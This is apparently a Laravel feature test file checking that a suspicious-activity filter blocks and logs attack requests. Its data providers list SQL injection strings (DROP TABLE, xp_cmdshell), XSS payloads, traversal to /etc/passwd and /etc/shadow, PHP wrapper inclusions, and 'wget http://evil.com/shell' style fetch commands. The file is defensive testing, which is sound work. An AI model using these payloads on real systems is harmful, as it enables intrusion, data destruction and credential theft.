<?php

namespace Tests\Feature\Security;

use App\Models\SecurityLog;
use App\Models\SecuritySetting;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;

class DetectSuspiciousActivityTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        SecuritySetting::create([
            'enable_suspicious_blocking' => true,
            'log_security_events' => true,
            'block_threshold' => 10,
        ]);
    }

    #[Test]
    #[DataProvider('sqlInjectionPayloadsProvider')]
    public function blocks_sql_injection_attempts(string $payload): void
    {
        $response = $this->get("/?search={$payload}");

        $response->assertStatus(403);
    }

    #[Test]
    #[DataProvider('xssPayloadsProvider')]
    public function blocks_xss_attempts(string $payload): void
    {
        $response = $this->get("/?q={$payload}");

        $response->assertStatus(403);
    }

    #[Test]
    #[DataProvider('pathTraversalPayloadsProvider')]
    public function blocks_path_traversal_attempts(string $payload): void
    {
        $response = $this->get("/?file={$payload}");

        $response->assertStatus(403);
    }

    #[Test]
    #[DataProvider('commandInjectionPayloadsProvider')]
    public function blocks_command_injection_attempts(string $payload): void
    {
        $response = $this->get("/?cmd={$payload}");

        $response->assertStatus(403);
    }

    #[Test]
    #[DataProvider('fileInclusionPayloadsProvider')]
    public function blocks_file_inclusion_attempts(string $payload): void
    {
        $response = $this->get("/?page={$payload}");

        $response->assertStatus(403);
    }

    #[Test]
    public function logs_suspicious_activity_to_security_log(): void
    {
        $this->get("/?search=1' OR '1'='1");

        $this->assertDatabaseHas('security_logs', [
            'threat_type' => 'sql_injection',
        ]);
    }

    #[Test]
    public function logs_xss_attempt_to_security_log(): void
    {
        $this->get('/?q=<script>alert(1)</script>');

        $this->assertDatabaseHas('security_logs', [
            'threat_type' => 'xss',
        ]);
    }

    #[Test]
    public function blocks_suspicious_user_agents(): void
    {
        $response = $this->withHeaders(['User-Agent' => 'sqlmap/1.6'])
            ->get('/');

        $response->assertStatus(403);
    }

    #[Test]
    public function blocks_scanner_user_agents(): void
    {
        $response = $this->withHeaders(['User-Agent' => 'nikto/2.5'])
            ->get('/');

        $response->assertStatus(403);
    }

    #[Test]
    public function normal_requests_are_not_blocked(): void
    {
        $response = $this->get('/');

        $response->assertStatus(200);
    }

    #[Test]
    public function allowed_admin_routes_are_not_blocked(): void
    {
        $response = $this->get('/admin/login');

        $response->assertStatus(200);
    }

    public static function sqlInjectionPayloadsProvider(): array
    {
        return [
            "1' OR '1'='1" => ["1' OR '1'='1"],
            'UNION SELECT' => ["1 UNION SELECT * FROM users"],
            'UNION ALL SELECT' => ["1 UNION ALL SELECT * FROM users"],
            'DROP TABLE' => ["1; DROP TABLE users"],
            'DELETE FROM' => ["1; DELETE FROM users"],
            'WAITFOR DELAY' => ["1; WAITFOR DELAY '0:0:5'"],
            'BENCHMARK' => ["BENCHMARK(1000000,MD5(1))"],
            'SLEEP' => ["SLEEP(5)"],
            'SQL comment' => ["1'--"],
            'xp_cmdshell' => ["exec xp_cmdshell('dir')"],
        ];
    }

    public static function xssPayloadsProvider(): array
    {
        return [
            'script tag' => ['<script>alert(1)</script>'],
            'img onerror' => ['<img src=x onerror=alert(1)>'],
            'body onload' => ['<body onload=alert(1)>'],
            'svg onload' => ['<svg onload=alert(1)>'],
            'javascript URI' => ['javascript:alert(1)'],
            'expression' => ['expression(alert(1))'],
            'eval' => ["eval('alert(1)')"],
        ];
    }

    public static function pathTraversalPayloadsProvider(): array
    {
        return [
            '../etc/passwd' => ['../../../etc/passwd'],
            '..\\windows' => ['..\\..\\windows\\system32'],
            'encoded traversal' => ['..%2F..%2F..%2Fetc%2Fpasswd'],
            '/etc/shadow' => ['/etc/shadow'],
            '/proc/self' => ['/proc/self/environ'],
        ];
    }

    public static function commandInjectionPayloadsProvider(): array
    {
        return [
            'semicolon ls' => ['; ls -la'],
            'pipe cat' => ['| cat /etc/passwd'],
            'wget' => ['wget http://evil.com/shell'],
            'curl' => ['curl http://evil.com'],
            'bash -c' => ['bash -c "cmd"'],
            'backtick' => ['`id`'],
        ];
    }

    public static function fileInclusionPayloadsProvider(): array
    {
        return [
            'php://filter' => ['php://filter/convert.base64-encode/resource=config'],
            'php://input' => ['php://input'],
            'expect://' => ['expect://id'],
            'data://' => ['data://text/plain;base64,dGVzdA=='],
        ];
    }
}
